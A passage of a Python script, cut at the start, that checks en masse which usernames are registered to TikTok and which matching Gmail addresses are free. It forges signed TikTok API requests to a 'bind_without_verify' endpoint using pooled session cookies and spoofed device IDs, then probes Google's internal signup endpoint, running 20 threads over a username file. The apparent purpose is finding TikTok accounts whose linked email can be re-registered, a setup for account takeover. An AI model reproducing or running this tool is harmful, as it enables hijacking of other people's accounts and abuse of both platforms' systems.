Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
            response = s.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    headers=headers,
    data=data,
).text
            if 'steps/signup/username' in response:
                pass
    except:''
    try:
            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
    'x-same-domain': '1',
}
            params = {
    'rpcids': 'NHJMOd',
    'source-path': '/lifecycle/steps/signup/username',
    'hl': 'en-US',
    'TL': tl,
    'rt': 'c',
}
            data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
            response = s.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,
    headers=headers,
    data=data,
).text
            email=email+'@gmail.com'
            if 'steps/signup/password' in response:
            	yas+=1
            	os.system('clear')
            	sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mTrue\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mEalse \033[0m  - \033[1;33m{ya}\033[0m   >
 < \033[1;33mCheck \033[0m  - \033[1;31m{no} : {len(lines)}\033[0m   >
 < \033[1;31 \033[0mBad gnm- \033[1;35m{nod}\033[0m  >
 < \033[1;36mEmail \033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()
            	info(email)
            else:
            	os.system('clear')
            	nod+=1
            	sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mTrue\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mEalse \033[0m  - \033[1;33m{ya}\033[0m   >
 < \033[1;33mCheck \033[0m  - \033[1;31m{no} : {len(lines)}\033[0m   >
 < \033[1;31 \033[0mBad gnm- \033[1;35m{nod}\033[0m  >
 < \033[1;36mEmail \033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()
            print(response)
    except:print('gg')

def chzm(email):
	email=email+'@gmail.com'
	global ya,no,yas,nod
	def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
	       x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
	       data=payload
	       if not unix: unix = int(time.time())
	       return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}		
	cookies={"sessionid": random.choice(nameee)}
	params={
	
    'aid': '1233',
   'app_language': 'ar',
    'device_id': str(random.randint(1, 10**19)),
    'device_platform': 'android',
    'iid': str(random.randint(1, 10**19)),
    'version_name': str(random.randint(1, 10**19)),
    'use_store_region_cookie': '1',
    'version_code': str(random.randint(1, 10**19)),
}
	he = {
        'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})',
        }

	data=f'email={email}'
	x_log = x_log = sign(urlencode(params), data,  str(uuid.uuid4()) + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
	he.update(x_log)
	res=requests.post(f'https://{random.choice(["inapp.tiktokv.com","api2.musical.ly","api16-normal-c-alisg.tiktokv.com","api2-19-h2.musical.ly"])}/passport/email/bind_without_verify/',data=data,headers=he,params=params,cookies=cookies).text
	print(res)
	if "فشل في الربط، تم ربط صندوق البريد بالحساب الآخر"in res:
		os.system('clear')
		ya+=1
		sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mTrue\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mEalse \033[0m  - \033[1;33m{ya}\033[0m   >
 < \033[1;33mCheck \033[0m  - \033[1;31m{no} : {len(lines)}\033[0m   >
 < \033[1;31 \033[0mBad gnm- \033[1;35m{nod}\033[0m  >
 < \033[1;36mEmail \033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()
		check_gmail(email)
	else:
		os.system('clear')
		no+=1
		sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
 < \033[1;32mTrue\033[0m  - \033[1;36m{yas}\033[0m  > 
 < \033[1;34mEalse \033[0m  - \033[1;33m{ya}\033[0m   >
 < \033[1;33mCheck \033[0m  - \033[1;31m{no} : {len(lines)}\033[0m   >
 < \033[1;31 \033[0mBad gnm- \033[1;35m{nod}\033[0m  >
 < \033[1;36mEmail \033[0m  - \033[1;32m{email}\033[0m>
\033[1;35m - — — — — — — — — — — — — —\033[0m
''');sys.stdout.flush()             
def main():
    try:
	    with open(fileuser, 'r') as f:
	        users = [line.strip() for line in f if line.strip()]
    except:
    	print('غير موجود')
    	exit()
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(chzm, users)
if __name__ == "__main__":
    main()
